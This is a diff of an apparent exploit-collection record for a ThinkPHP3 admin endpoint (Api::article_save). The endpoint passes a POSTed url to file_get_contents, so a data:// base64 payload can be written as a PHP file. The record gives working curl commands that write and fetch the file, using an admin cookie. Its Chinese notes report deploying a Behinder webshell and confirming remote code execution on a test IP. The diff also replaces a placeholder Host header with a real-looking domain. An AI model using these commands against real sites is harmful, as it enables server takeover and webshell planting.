@@ -8,7 +8,7 @@
 - **language**: http
 - **source**: self
 - **verified**: 1
-- **verified_note**: 在 203.0.113.22 实测：POST article_save ename=vsprobe&url=data://text/plain;base64,PD9waHAgZWNobyAiTUFSS0VSX09LIjsgPz4= → 200 且 cont 回显写入内容；GET /Public/www/main_r3_vsprobe.php → 200 body=MARKER_OK。用同一原语部署冰蝎马 main_r3_bkk0pmgc.php 并冰蝎协议实测 RCE 回显（php_uname → Linux target386.example.com 3.10.0-862.6.3.el7.x86_64）。
+- **verified_note**: 在 203.0.113.22 实测：POST article_save ename=vsprobe&url=data://text/plain;base64,PD9waHAgZWNobyAiTUFSS0VSX09LIjsgPz4= → 200 且 cont 回显写入内容；GET /Public/www/main_r3_vsprobe.php → 200 body=MARKER_OK。用同一原语部署冰蝎马 main_r3_bkk0pmgc.php 并冰蝎协议实测 RCE 回显（php_uname → Linux Ef6SU2xf.VM.com 3.10.0-862.6.3.el7.x86_64）。
 - **path**: pocs/thinkphp3-后台-api-article_save-任意文件写入-data-伪协议-webshell/poc.http
 - **tags**: thinkphp,任意文件写入,data协议,getshell,rce
 - **created_at**: 2026-10-13T08:43:08.050Z
@@ -25,12 +25,12 @@ ThinkPHP3 后台 Api::article_save 把 $_POST['url'] 交给 file_get_contents() 
 B64=$(printf '%s' '<?php echo "MARKER_OK"; ?>' | base64 -w0)
 # 2) 写入
 curl -k -s --noproxy '*' -X POST \
-  -H "Host: target385.example.com" \
+  -H "Host: example.jbg.mysqbbthisgoodsfor33333user.top" \
   -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
   -d "ename=vsprobe&url=data://text/plain;base64,$B64" \
   "https://203.0.113.22/example.com?g=Admin&m=Api&a=article_save"
 # 3) 验证
-curl -k -s --noproxy '*' -H "Host: target385.example.com" \
+curl -k -s --noproxy '*' -H "Host: example.jbg.mysqbbthisgoodsfor33333user.top" \
   "https://203.0.113.22/Public/www/main_r3_vsprobe.php"
 需替换：Host、Cookie、ename、b64 载荷。
 ```
